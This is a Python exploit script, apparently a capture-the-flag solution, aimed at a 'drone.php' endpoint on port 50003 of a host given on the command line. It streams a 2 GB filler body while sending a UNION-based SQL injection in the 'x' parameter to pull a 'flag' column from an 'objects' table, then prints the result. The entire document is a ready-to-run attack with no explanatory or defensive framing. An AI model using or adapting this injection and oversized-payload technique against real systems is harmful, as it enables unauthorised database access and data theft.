#!/usr/bin/env python3

import requests
import sys
from tqdm import tqdm

PORT = 50003

if len(sys.argv) > 1:
    IP = sys.argv[1]
else:
    IP = "localhost"

class HugePayload:
    def __init__(self, size, chunk_size=1024 * 1024, char=b'A'):  # 1MB чанки
        self.size = size
        self.chunk_size = chunk_size
        self.char = char
        self.sent = 0
        self.pbar = tqdm(total=size, unit='B', unit_scale=True, unit_divisor=1024, desc="Uploading")

    def __iter__(self):
        remaining = self.size
        while remaining > 0:
            chunk = self.char * min(self.chunk_size, remaining)
            yield chunk
            self.sent += len(chunk)
            self.pbar.update(len(chunk))
            remaining -= len(chunk)
        self.pbar.close()

two_gb = 2 * 1024 * 1024 * 1024

params = {
    "x": " OR 1=1 UNION SELECT 1, flag, 1, 1 FROM objects WHERE flag IS NOT NULL -- ",
    "y": "112"
}

headers = {
    "Content-Type": "application/octet-stream"
}

url = f"http://{IP}:{PORT}/drone.php"

try:
    resp = requests.post(url, params=params, data=HugePayload(two_gb), headers=headers, timeout=600)
    resp.raise_for_status()
    data = resp.json()
    print(data.get("name", "Flag not found"))
except Exception as e:
    print("Error:", e)
